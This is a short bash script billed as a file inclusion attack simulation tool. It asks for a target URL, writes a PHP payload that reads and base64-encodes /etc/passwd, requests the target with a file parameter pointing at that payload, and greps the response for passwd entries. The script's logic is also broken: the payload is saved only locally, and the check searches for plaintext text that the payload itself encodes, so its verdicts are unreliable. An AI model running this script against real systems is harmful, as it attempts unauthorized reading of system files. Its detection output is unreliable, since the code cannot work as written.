#!/bin/bash
# This is a comment

# Define color escape codes
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Function to perform File Inclusion Vulnerability Attack Simulation
simulate_file_inclusion_attack() {
    echo -e "${RED}Simulating File Inclusion Vulnerability Attack...${NC}"
    # Read the target URL from user input
    read -p "Enter your target URL: " vulnerable_endpoint
    
    # Define the malicious code
    malicious_code='<?php $contents = file_get_contents("/etc/passwd"); echo base64_encode($contents); ?>'
    
    # Save the malicious code to a temporary file
    echo "$malicious_code" > malicious_file.php
    
    # Send a request with the parameter set to the path of the malicious file
    response=$(curl -s "$vulnerable_endpoint?file=malicious_file.php")
    echo "$response" > response.txt
}

# Function to test for vulnerability
test_vulnerability() {
    echo "Testing for vulnerability..."
    # Check if the response contains the base64 encoded contents of /etc/passwd
    if grep -q "root:" response.txt && grep -q "nobody:" response.txt; then
        echo -e "${RED}Vulnerability detected!${NC}"
        echo "Sensitive information detected in the response."
    else
        echo -e "${GREEN}No vulnerability detected.${NC}"
        echo "The response does not contain sensitive information."
    fi
}

# Main function
main() {
    echo -e "${GREEN}File Inclusion Vulnerability Attack Simulation Tool${NC}"
    echo "----------------------------------------------------"

    # Perform File Inclusion Vulnerability Attack Simulation
    simulate_file_inclusion_attack

    # Test for vulnerability
    test_vulnerability
}

# Call main function
main
